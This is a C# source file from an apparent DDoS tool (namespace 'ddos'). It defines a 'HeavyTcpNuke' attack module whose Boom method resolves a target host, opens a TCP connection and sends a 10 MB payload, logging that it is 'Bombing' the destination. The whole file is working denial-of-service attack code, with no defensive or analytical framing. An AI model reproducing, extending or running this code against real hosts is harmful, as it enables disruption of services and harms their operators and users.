using ddos.Interfaces;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ddos.Silo
{
    public class HeavyTcpNuke : BaseNuke
    {
        private readonly ITools _tools;
        public HeavyTcpNuke(ITools tools, ILogger<HeavyTcpNuke> logger, IServiceProvider serviceProvider, IAppArgs appArgs) : base(logger, serviceProvider, appArgs)
        {
            _tools = tools ?? throw new ArgumentNullException(nameof(tools));
        }

        public override async Task Boom(string destination, bool useProxy, CancellationToken cancellationToken)
        {
            if (destination == null)
                throw new ArgumentNullException(nameof(destination));

            cancellationToken.ThrowIfCancellationRequested();

            Logger.LogInformation($"Heavy Tcp...");
            Logger.LogInformation($"Bombing {destination}");

            try
            {
                var ip = await _tools.GetIP(destination) ?? throw new Exception($"IP for {destination} can not resolved.");
                Logger.LogInformation($"IP is {ip}");
                using (var s = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
                using (var ct = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken))
                {                    
                    ct.CancelAfter(TimeSpan.FromSeconds(AppArgs.HttpTimeOut));

                    await s.ConnectAsync(ip, ct.Token);
                    s.Send(await _tools.CreateLoad(10485760));
                    s.Close();
                }

            }
            catch (OperationCanceledException)
            {
                Logger.LogError("Time out.");
            }
            catch (Exception ex)
            {
                Logger.LogError(ex.Message, ex);
            }

        }

        public override string WhoAmI()
        {
            return "HeavyTcp";
        }
    }
}
